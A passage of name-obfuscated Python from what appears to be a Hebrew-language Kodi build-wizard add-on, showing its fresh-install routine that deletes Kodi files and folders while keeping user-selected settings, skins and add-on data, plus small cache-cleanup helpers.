				if O0O00000O00OO00OO .startswith ('pvr'):#line:5303
					wiz .setS ('pvrclient',O0O00000O00OO00OO )#line:5304
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5305
		OO00OO0O0000000OO =wiz .latestDB ('Addons')#line:5306
		for O0000O0O00O0OOOO0 ,O0000OO0O0O000OO0 ,O0O00O0OO0O0OO0OO in os .walk (O00O0OOO0OOOO000O ,topdown =True ):#line:5307
			O0000OO0O0O000OO0 [:]=[O0O0O000OOOO0O000 for O0O0O000OOOO0O000 in O0000OO0O0O000OO0 if O0O0O000OOOO0O000 not in EXCLUDES ]#line:5308
			for OO0OO0O0OO0OO00OO in O0O00O0OO0O0OO0OO :#line:5309
				OO0OO0OO0O0OOOO0O +=1 #line:5310
				O000OO0OO00000000 =O0000O0O00O0OOOO0 .replace ('/','\\').split ('\\')#line:5311
				O0O00OO00OO0OOOOO =len (O000OO0OO00000000 )-1 #line:5313
				if O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5314
				elif OO0OO0O0OO0OO00OO =='MyVideos99.db'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5315
				elif OO0OO0O0OO0OO00OO =='MyVideos107.db'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5316
				elif OO0OO0O0OO0OO00OO =='MyVideos116.db'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5317
				elif OO0OO0O0OO0OO00OO =='MyVideos99.db'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5318
				elif OO0OO0O0OO0OO00OO =='MyVideos107.db'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5319
				elif OO0OO0O0OO0OO00OO =='MyVideos116.db'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5320
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5321
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'skin.anonymous.mod'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5322
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'skin.Premium.mod'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5323
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'skin.anonymous.nox'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5324
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'skin.phenomenal'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5325
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.metalliq'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5326
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'skin.titan'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5328
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'pvr.iptvsimple'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5329
				elif OO0OO0O0OO0OO00OO =='sources.xml'and O000OO0OO00000000 [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5331
				elif OO0OO0O0OO0OO00OO =='quicknav.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5334
				elif OO0OO0O0OO0OO00OO =='x1101.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5335
				elif OO0OO0O0OO0OO00OO =='b-srtym-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5336
				elif OO0OO0O0OO0OO00OO =='x1102.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5337
				elif OO0OO0O0OO0OO00OO =='b-sdrvt-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5338
				elif OO0OO0O0OO0OO00OO =='x1112.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5339
				elif OO0OO0O0OO0OO00OO =='b-tlvvyzyh-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5340
				elif OO0OO0O0OO0OO00OO =='x1111.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5341
				elif OO0OO0O0OO0OO00OO =='b-tvknyshrly-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5342
				elif OO0OO0O0OO0OO00OO =='x1110.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5343
				elif OO0OO0O0OO0OO00OO =='b-yldym-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5344
				elif OO0OO0O0OO0OO00OO =='x1114.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5345
				elif OO0OO0O0OO0OO00OO =='b-mvzyqh-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5346
				elif OO0OO0O0OO0OO00OO =='mainmenu.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5347
				elif OO0OO0O0OO0OO00OO =='skin.Premium.mod.properties'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5348
				elif OO0OO0O0OO0OO00OO =='x1122.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5350
				elif OO0OO0O0OO0OO00OO =='b-spvrt-b.DATA.xml'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5351
				elif OO0OO0O0OO0OO00OO =='favourites.xml'and O000OO0OO00000000 [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5356
				elif OO0OO0O0OO0OO00OO =='guisettings.xml'and O000OO0OO00000000 [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5358
				elif OO0OO0O0OO0OO00OO =='profiles.xml'and O000OO0OO00000000 [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5359
				elif OO0OO0O0OO0OO00OO =='advancedsettings.xml'and O000OO0OO00000000 [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5360
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5361
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'program.apollo'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5362
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5363
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.telemedia'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5364
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.elementum'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5367
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5369
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'weather.yahoo'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5370
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.quasar'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5371
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'program.apollo'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5372
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5373
				elif O000OO0OO00000000 [O0O00OO00OO0OOOOO -2 ]=='userdata'and O000OO0OO00000000 [O0O00OO00OO0OOOOO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O000OO0OO00000000 [O0O00OO00OO0OOOOO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5374
				elif OO0OO0O0OO0OO00OO in LOGFILES :wiz .log ("Keep Log File: %s"%OO0OO0O0OO0OO00OO ,xbmc .LOGNOTICE )#line:5375
				elif OO0OO0O0OO0OO00OO .endswith ('.db'):#line:5376
					try :#line:5377
						if OO0OO0O0OO0OO00OO ==OO00OO0O0000000OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OO0OO0O0OO0OO00OO ,KODIV ),xbmc .LOGNOTICE )#line:5378
						else :os .remove (os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ))#line:5379
					except Exception as O0O0OOO0OOO000O00 :#line:5380
						if not OO0OO0O0OO0OO00OO .startswith ('Textures13'):#line:5381
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5382
							wiz .log ("-> %s"%(str (O0O0OOO0OOO000O00 )),xbmc .LOGNOTICE )#line:5383
							wiz .purgeDb (os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ))#line:5384
				else :#line:5385
					DP .update (int (wiz .percentage (OO0OO0OO0O0OOOO0O ,O00O0000OOOO0O000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0OO0OO00OO ),'')#line:5386
					try :os .remove (os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ))#line:5387
					except Exception as O0O0OOO0OOO000O00 :#line:5388
						wiz .log ("Error removing %s"%os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),xbmc .LOGNOTICE )#line:5389
						wiz .log ("-> / %s"%(str (O0O0OOO0OOO000O00 )),xbmc .LOGNOTICE )#line:5390
			if DP .iscanceled ():#line:5391
				DP .close ()#line:5392
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5393
				return False #line:5394
		for O0000O0O00O0OOOO0 ,O0000OO0O0O000OO0 ,O0O00O0OO0O0OO0OO in os .walk (O00O0OOO0OOOO000O ,topdown =True ):#line:5395
			O0000OO0O0O000OO0 [:]=[OO00OO0OOO0O0OOO0 for OO00OO0OOO0O0OOO0 in O0000OO0O0O000OO0 if OO00OO0OOO0O0OOO0 not in EXCLUDES ]#line:5396
			for OO0OO0O0OO0OO00OO in O0000OO0O0O000OO0 :#line:5397
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO0O0OO0OO00OO ),'')#line:5398
			  if OO0OO0O0OO0OO00OO not in ["Database","userdata","temp","addons","addon_data"]:#line:5399
			   if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5400
			    if not (OO0OO0O0OO0OO00OO =='skin.titan'and KEEPSKIN3 =='true'):#line:5402
			      if not (OO0OO0O0OO0OO00OO =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5403
			       if not (OO0OO0O0OO0OO00OO =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5404
			        if not (OO0OO0O0OO0OO00OO =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5405
			         if not (OO0OO0O0OO0OO00OO =='program.apollo'and KEEPINFO =='true'):#line:5406
			          if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5407
			           if not (OO0OO0O0OO0OO00OO =='weather.yahoo'and KEEPWEATHER =='true'):#line:5408
			            if not (OO0OO0O0OO0OO00OO =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5409
			             if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5410
			              if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5411
			               if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5412
			                if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5413
			                 if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5414
			                  if not (OO0OO0O0OO0OO00OO =='plugin.video.neptune'and KEEPINFO =='true'):#line:5415
			                   if not (OO0OO0O0OO0OO00OO =='plugin.video.youtube'and KEEPINFO =='true'):#line:5416
			                    if not (OO0OO0O0OO0OO00OO =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5417
			                     if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5418
			                      if not (OO0OO0O0OO0OO00OO =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5419
			                       if not (OO0OO0O0OO0OO00OO =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5420
			                           if not (OO0OO0O0OO0OO00OO =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5424
			                            if not (OO0OO0O0OO0OO00OO =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5425
			                             if not (OO0OO0O0OO0OO00OO =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5426
			                              if not (OO0OO0O0OO0OO00OO =='plugin.video.quasar'and KEEPINFO =='true'):#line:5427
			                               if not (OO0OO0O0OO0OO00OO =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5428
			                                  shutil .rmtree (os .path .join (O0000O0O00O0OOOO0 ,OO0OO0O0OO0OO00OO ),ignore_errors =True ,onerror =None )#line:5430
			if DP .iscanceled ():#line:5431
				DP .close ()#line:5432
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5433
				return False #line:5434
		DP .close ()#line:5435
		wiz .clearS ('build')#line:5436
		if over ==True :#line:5437
			return True #line:5438
		elif install =='restore':#line:5439
			return True #line:5440
		elif install :#line:5441
			buildWizard (install ,'normal',over =True )#line:5442
		else :#line:5443
			if INSTALLMETHOD ==1 :O0000000OO00OOOOO =1 #line:5444
			elif INSTALLMETHOD ==2 :O0000000OO00OOOOO =0 #line:5445
			else :O0000000OO00OOOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5446
			if O0000000OO00OOOOO ==1 :wiz .reloadFix ('fresh')#line:5447
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5448
	else :#line:5449
		if not install =='restore':#line:5450
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5451
			wiz .refresh ()#line:5452
def clearCache ():#line:5457
		wiz .clearCache ()#line:5458
def fixwizard ():#line:5462
		wiz .fixwizard ()#line:5463
def totalClean ():#line:5465
		wiz .clearCache ()#line:5467
		wiz .clearPackages ('total')#line:5468
		clearThumb ('total')#line:5469
		cleanfornewbuild ()#line:5470
def cleanfornewbuild ():#line:5471
		try :#line:5472
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5473
		except :#line:5474
			pass #line:5475
		try :#line:5476
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5477
		except :#line:5478
			pass #line:5479
